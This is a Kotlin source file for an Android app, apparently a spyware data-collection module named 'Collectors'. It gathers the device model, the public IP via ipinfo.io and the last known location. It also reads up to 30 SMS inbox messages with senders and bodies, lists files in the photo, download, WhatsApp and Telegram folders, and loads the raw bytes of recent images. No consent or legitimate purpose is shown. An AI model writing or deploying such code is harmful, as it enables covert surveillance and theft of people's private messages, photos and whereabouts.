package com.rajput.info

import android.content.Context
import android.location.LocationManager
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object Collectors {

    fun deviceInfo(ctx: Context): String {
        val b = StringBuilder()
        b.appendLine("Device")
        b.appendLine("Model: \${Build.MANUFACTURER} \${Build.MODEL}")
        b.appendLine("Android: \${Build.VERSION.RELEASE} (SDK \${Build.VERSION.SDK_INT})")
        b.appendLine("Brand: \${Build.BRAND}")
        b.appendLine("Device: \${Build.DEVICE}")
        b.appendLine("Time: \${SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault()).format(Date())}")
        return b.toString()
    }

    fun ipInfo(): String {
        val client = OkHttpClient.Builder().build()
        val req = Request.Builder().url("https://ipinfo.io/json").build()
        return runCatching {
            client.newCall(req).execute().use { res ->
                res.body?.string() ?: "{}"
            }
        }.getOrDefault("no ip")
    }

    fun location(ctx: Context): String {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)
        val best = providers.mapNotNull { p ->
            runCatching { lm.getLastKnownLocation(p) }.getOrNull()
        }.maxByOrNull { it.time }
        return if (best == null) "no location (GPS band?)"
        else "Lat: \${best.latitude}\nLon: \${best.longitude}\nAcc: \${best.accuracy}m\nTime: \${best.time}\nProvider: \${best.provider}"
    }

    fun sms(ctx: Context, limit: Int = 30): String {
        val sb = StringBuilder()
        runCatching {
            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date"),
                null, null, "date DESC"
            ) ?: return@runCatching
            cursor.use { c ->
                var n = 0
                while (c.moveToNext() && n < limit) {
                    val addr = c.getString(0) ?: "?"
                    val body = c.getString(1) ?: ""
                    val ts = c.getLong(2)
                    val t = SimpleDateFormat("dd/MM HH:mm", Locale.getDefault()).format(Date(ts))
                    sb.appendLine("[\$t] \$addr")
                    sb.appendLine("  \${body.take(200)}")
                    sb.appendLine()
                    n++
                }
            }
        }
        return sb.ifEmpty { StringBuilder("no sms (permission denied or role needed)") }.toString()
    }

    fun listFiles(): String {
        val root = Environment.getExternalStorageDirectory()
        val dirs = listOf(
            File(root, "DCIM"),
            File(root, "Pictures"),
            File(root, "Download"),
            File(root, "Documents"),
            File(root, "WhatsApp"),
            File(root, "Telegram")
        )
        val sb = StringBuilder("Files\n")
        for (d in dirs) {
            if (!d.exists() || !d.isDirectory) continue
            sb.appendLine("\n📁 \${d.name}/")
            runCatching {
                d.listFiles()?.take(30)?.forEach { f ->
                    val size = if (f.isDirectory) "dir" else "\${f.length() / 1024} KB"
                    sb.appendLine("  \${f.name}  (\$size)")
                }
            }
        }
        return sb.toString().take(4000)
    }

    fun recentImages(ctx: Context, limit: Int = 3): List<Pair<String, ByteArray>> {
        val out = mutableListOf<Pair<String, ByteArray>>()
        runCatching {
            val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
            val cursor = ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null,
                "\${MediaStore.Images.Media.DATE_ADDED} DESC"
            ) ?: return@runCatching
            cursor.use { c ->
                var n = 0
                while (c.moveToNext() && n < limit) {
                    val id = c.getLong(0)
                    val name = c.getString(1) ?: "image_\$n.jpg"
                    val uri = android.content.ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    val bytes = runCatching {
                        ctx.contentResolver.openInputStream(uri)?.use { it.readBytes() }
                    }.getOrNull()
                    if (bytes != null) out += name to bytes
                    n++
                }
            }
        }
        return out
    }
}
